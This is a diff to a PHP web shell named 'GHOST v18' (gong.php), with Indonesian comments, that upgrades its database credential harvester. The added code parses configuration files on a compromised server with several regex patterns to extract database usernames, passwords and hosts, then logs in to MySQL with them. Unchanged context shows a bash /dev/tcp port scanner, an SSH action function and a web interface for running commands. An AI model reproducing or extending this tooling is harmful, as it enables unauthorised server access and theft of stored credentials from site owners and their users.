@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0..6: Full UI (Event Listener Based), Fix JSON.
+// GHOST v18 - section 0..6: Full UI, Advanced DB Parser.
 
-define('GH_VER',      '18.0.0-final-fix');
+define('GH_VER',      '18.0.0-final-2');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -316,14 +316,37 @@ function gh_db_harvest() {
         $c = gh_read($cf);
         if ($c) {
             $logs[] = "[+] Config ditemukan: $cf";
-            if (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
-            if (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
-            if (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
-            if ($db_user && $db_pass) break;
+            
+            // Advanced Parser:
+            // 1. Coba pola array: $db['user'] = 'xxx' / $config['username'] = 'xxx'
+            if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = $m[1];
+            // 2. Coba pola define: define('DB_USER', 'xxx')
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = $m[1];
+            // 3. Coba pola assign: $user = 'xxx'
+            elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
+
+            // Pass
+            if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = $m[1];
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = $m[1];
+            elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
+
+            // Host
+            if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = $m[1];
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = $m[1];
+            elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
+
+            if ($db_user && $db_pass) {
+                $logs[] = "[+] BERHASIL mengekstrak kredensial dari config!";
+                break;
+            } else {
+                // Kalau gagal ekstrak, tampilin preview 3 baris pertama biar user tau formatnya
+                $preview = substr(trim($c), 0, 150);
+                $logs[] = "    [-] Gagal parsing otomatis. Preview: " . str_replace("\n", " ", $preview) . "...";
+            }
         }
     }
     
-    if ($db_user) {
+    if ($db_user && $db_pass) {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
         if (gh_can('mysqli_connect')) {
@@ -341,7 +364,9 @@ function gh_db_harvest() {
                 } else { $logs[] = "[-] Gagal MYSQLI: " . mysqli_connect_error(); }
             } catch (Throwable $e) { $logs[] = "[-] MYSQLI Error: " . $e->getMessage(); }
         } else { $logs[] = "[-] mysqli_connect di-disable."; }
-    } else { $logs[] = "[-] Config user/pass tidak ditemukan di lokasi standar."; }
+    } else { 
+        $logs[] = "[-] Config user/pass tidak ditemukan di lokasi standar (atau format tidak dikenal)."; 
+    }
     return array('logs' => $logs, 'info' => $info);
 }
 
@@ -400,7 +425,6 @@ function gh_ssh_action($action, $key) {
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     
-    // Bash /dev/tcp trik. Jauh lebih stabil dari PHP fsockopen di LiteSpeed.
     $bash_script = '';
     foreach ($ports as $p) {
         $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";";
@@ -629,7 +653,6 @@ function gh_ui() {
 </div>
 
 <script>
-// Ganti event onclick inline jadi Event Listener biar gak crash
 document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('btn-exec').onclick = execCmd;
     document.getElementById('cmd').onkeydown = e => { if(e.key==='Enter') execCmd(); };
